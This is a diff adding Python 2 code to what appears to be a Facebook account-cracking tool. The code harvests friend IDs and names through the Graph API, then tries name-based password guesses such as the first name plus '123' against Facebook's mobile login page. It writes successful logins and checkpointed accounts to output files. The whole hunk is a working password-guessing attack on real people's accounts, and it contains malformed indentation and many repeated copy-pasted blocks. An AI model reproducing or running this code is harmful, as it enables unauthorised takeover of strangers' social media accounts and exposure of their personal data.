@@ -865,4 +865,275 @@ def xokpauto():
         uid = i['id']
         na = i['name']
         rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')			
+        fuck.write(uid + '|' + na + '\n')
+fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    os.system('rm -rf newlinks.txt')
+    os.system('cat jok.txt | grep '+l1+' >> newlinks.txt')
+    os.system('cat jok.txt | grep '+l2+' >> newlinks.txt')
+    os.system('rm -rf kk.txt')
+    os.system('rm -rf jok.txt')
+    os.system('clear')
+    print logo
+    print ""
+    try:
+        for line in open("newlinks.txt",'r').readlines():
+            idx.append(line.strip())
+    except:
+        fb_menu()
+    print "[!] total ids : "+str(len(idx))
+    os.system('echo " -----------------------------------"| lolcat')
+    print "    Cracking Start Please Wait .."
+    print "   Use Flight Mod For Speed Up"
+    os.system('echo " -----------------------------------"| lolcat')
+    def main(arg):
+        user=arg
+        uid, name = user.split("|")
+        name=name.lower()
+        first = name.rsplit(' ')[0]
+        try:
+            last = name.rsplit(' ')[1]
+        except:
+            pass
+        myagents=random.choice(["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8", "Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12"])
+        try:
+            pass1 = name
+            rana = requests.Session()
+            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+            p = rana.get('https://mbasic.facebook.com')
+            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
+            if 'c_user' in rana.cookies.get_dict().keys():
+                print "\x1b[1;92m[SHANI-OK] "+uid + " | " + pass1
+                ok=open('SHANI-ok.txt', 'a')
+                ok.write(uid+ " | " +pass1+ "\n")
+                ok.close()
+                oks.append(uid+pass1)
+            else:
+                if 'checkpoint' in rana.cookies.get_dict().keys():
+                    print "\x1b[1;91m[SHANI-CP] "+uid + " | " + pass1
+                    cp=open('SHSNI-cp.txt', 'a')
+                    cp.write(uid+ " | " +pass1+ "\n")
+                    cp.close()
+                    cps.append(uid+pass1)
+                else:
+                    pass2 = first+"123"
+                    rana = requests.Session()
+                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+                    p = rana.get('https://mbasic.facebook.com')
+                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
+                    if 'c_user' in rana.cookies.get_dict().keys():
+                        print "\x1b[1;92m[SHANI-OK] "+uid + " | " + pass2
+                        ok=open('SHANI-ok.txt', 'a')
+                        ok.write(uid+ " | " +pass2+ "\n")
+                        ok.close()
+                        oks.append(uid+pass2)
+                    else:
+                        if 'checkpoint' in rana.cookies.get_dict().keys():
+                            print "\x1b[1;91m[SHANI-CP] "+uid + " | " + pass2
+                            cp=open('SHANI-cp.txt', 'a')
+                            cp.write(uid+ " | " +pass2+ "\n")
+                            cp.close()
+                            cps.append(uid+pass2)
+                        else:
+                            pass3 = first+"12"
+                            rana = requests.Session()
+                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+                            p = rana.get('https://mbasic.facebook.com')
+                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
+                            if 'c_user' in rana.cookies.get_dict().keys():
+                                print "\x1b[1;92m[SHANI-OK] "+uid + " | " + pass3
+                                ok=open('SHANI-ok.txt', 'a')
+                                ok.write(uid+ " | " +pass3+ "\n")
+                                ok.close()
+                                oks.append(uid+pass3)
+                            else:
+                                if 'checkpoint' in rana.cookies.get_dict().keys():
+                                    print "\x1b[1;91m[SHANI-CP] "+uid + " | " + pass3
+                                    cp=open('SHANI-cp.txt', 'a')
+                                    cp.write(uid+ " | " +pass3+ "\n")
+                                    cp.close()
+                                    cps.append(uid+pass3)
+                                else:
+                                    pass4 = first+"12345"
+                                    rana = requests.Session()
+                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+                                    p = rana.get('https://mbasic.facebook.com')
+                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
+                                    if 'c_user' in rana.cookies.get_dict().keys():
+                                        print "\x1b[1;92m[SHANI-OK] "+uid + " | " + pass4
+                                        ok=open('SHANI-ok.txt', 'a')
+                                        ok.write(uid+ " | " +pass4+ "\n")
+                                        ok.close()
+                                        oks.append(uid+pass4)
+                                    else:
+                                        if 'checkpoint' in rana.cookies.get_dict().keys():
+                                            print "\x1b[1;91m[SHANI-CP] "+uid + " | " + pass4
+                                            cp=open('SHANI-cp.txt', 'a')
+                                            cp.write(uid+ " | " +pass4+ "\n")
+                                            cp.close()
+                                            cps.append(uid+pass4)
+                                        else:
+                                            pass5 = last+"786"
+                                            rana = requests.Session()
+                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+                                            p = rana.get('https://mbasic.facebook.com')
+                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
+                                            if 'c_user' in rana.cookies.get_dict().keys():
+                                                print "\x1b[1;92m[SHANI-OK] "+uid + " | " + pass5
+                                                ok=open('SHANI-ok.txt', 'a')
+                                                ok.write(uid+ " | " +pass5+ "\n")
+                                                ok.close()
+                                                oks.append(uid+pass5)
+                                            else:
+                                                if 'checkpoint' in rana.cookies.get_dict().keys():
+                                                    print "\x1b[1;91m[SHANI-CP] "+uid + " | " + pass5
+                                                    cp=open('SHANI-cp.txt', 'a')
+                                                    cp.write(uid+ " | " +pass5+ "\n")
+                                                    cp.close()
+                                                    cps.append(uid+pass5)
+                            
+                    
+			
